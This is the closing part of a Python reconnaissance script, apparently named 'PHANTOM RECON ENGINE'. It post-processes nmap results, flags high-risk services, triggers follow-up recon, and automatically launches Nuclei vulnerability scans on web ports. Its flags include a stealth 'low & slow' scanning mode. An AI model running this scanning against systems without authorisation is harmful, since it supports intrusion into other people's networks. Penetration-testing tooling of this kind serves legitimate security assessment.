        timeline_entries.append(f"🌐 Domains: {', '.join(sorted(domains))}")
    else:
        phase_result("No domains detected in scan output", "grey50")

    # ── Service Enrichment ──
    enriched = enrich_services(services, target, main_domain)
    critical_count = len([s for s in enriched if s.get("intel") and s["intel"]["risk"] == "CRITICAL"])
    high_count = len([s for s in enriched if s.get("intel") and s["intel"]["risk"] == "HIGH"])
    if critical_count:
        phase_result(f"🔴 {critical_count} CRITICAL risk services detected!", "red")
    if high_count:
        phase_result(f"🟠 {high_count} HIGH risk services detected", "yellow")

    # ── Generate enriched report ──
    generate_services_md(enriched, target, domains, report_file)
    phase_result(f"Report → {report_file}", "cyan")

    # ── Reactive Recon ──
    phase_result("Launching reactive recon based on detected services...", "magenta")
    launched = launch_reactive_recon(enriched, target, main_domain, scratch_dir)

    if launched:
        timeline_entries.append(f"🚀 Reactive recon: {', '.join(n for n, _ in launched)}")
    else:
        phase_result("No reactive recon triggers matched", "grey50")

    # ── Consolidated Summary ──
    summary_file = generate_recon_summary(enriched, target, domains, launched, nmap_dir)
    phase_result(f"Summary → {summary_file}", "cyan")

    elapsed_p5 = time.time() - t0
    phase_timing(elapsed_p5)

    # ── Timeline ──
    total_time = time.time() - global_start
    timeline_entries.append(f"✅ nmap_scan complete in {total_time:.0f}s")
    update_timeline(out_dir, timeline_entries)

    # ── Nuclei Master Scan ──
    if not no_nuclei:
        web_ports = [s["port"] for s in enriched if s["proto"] == "tcp" and s["port"] in ["80", "443", "8080", "8443", "8000"]]
        if web_ports and shutil.which("nuclei"):
            phase_result(f"☢️  Launching Nuclei on {len(web_ports)} web ports...", "red")
            target_host = main_domain if main_domain else target
            nuclei_targets = []
            for p in web_ports:
                proto = "https" if p in ["443", "8443"] else "http"
                url = f"{proto}://{target_host}" if p in ["80", "443"] else f"{proto}://{target_host}:{p}"
                nuclei_targets.append(url)
            
            nuclei_cmd = f"echo '━━━ NUCLEI MASTER SCAN ━━━' && nuclei -u {','.join(nuclei_targets)} -as -etags ssl,network -severity critical,high,medium"
            spawn_terminal("Nuclei-Master", nuclei_cmd)
            timeline_entries.append("☢️ Nuclei master scan launched")
            update_timeline(out_dir, timeline_entries)

    # ══════════════════════════════════════════════════════════════════
    # FINAL DASHBOARD
    # ══════════════════════════════════════════════════════════════════
    print_final_dashboard(enriched, domains, launched, target, total_time)

    # Copy ports to clipboard (cross-platform)
    all_ports = ",".join(s["port"] for s in enriched if s["proto"] == "tcp")
    if all_ports:
        try:
            if shutil.which("pbcopy"):
                subprocess.run(["pbcopy"], input=all_ports.encode(), timeout=2)
            elif shutil.which("xclip"):
                subprocess.run(["xclip", "-selection", "clipboard"], input=all_ports.encode(), timeout=2)
            elif shutil.which("wl-copy"):
                subprocess.run(["wl-copy"], input=all_ports.encode(), timeout=2)
            if HAS_RICH:
                console.print(f"  [grey50]📋 TCP ports copied to clipboard: {all_ports}[/]")
        except Exception:
            pass


# ═══════════════════════════════════════════════════════════════════════════════
# CLI ENTRY POINT
# ═══════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    args = [a for a in sys.argv[1:] if not a.startswith("-")]
    flags = [a for a in sys.argv[1:] if a.startswith("-")]

    fast = any(f in ("--fast", "--quick", "--tcp-only", "--no-udp") for f in flags)
    stealth = any(f in ("--stealth", "--slow") for f in flags)
    no_nuclei = any(f in ("--no-nuclei",) for f in flags)

    if not args:
        if HAS_RICH:
            console.print(Panel.fit(
                f"[bold gold1]PHANTOM RECON ENGINE[/] v{VERSION}\n\n"
                "[cyan]Usage:[/] nmap_scan <target> [flags]\n\n"
                "[bold]Flags:[/]\n"
                "  [green]--fast[/]       Skip UDP scan (TCP only)\n"
                "  [yellow]--stealth[/]    Low & slow scanning\n"
                "  [red]--no-nuclei[/]  Skip automatic Nuclei scan\n",
                border_style="magenta", box=box.ROUNDED
            ))
        else:
            print(f"Usage: nmap_scan <target> [--fast] [--stealth] [--no-nuclei]")
    else:
        run_nmap_scan(args[0], fast=fast, stealth=stealth, no_nuclei=no_nuclei)
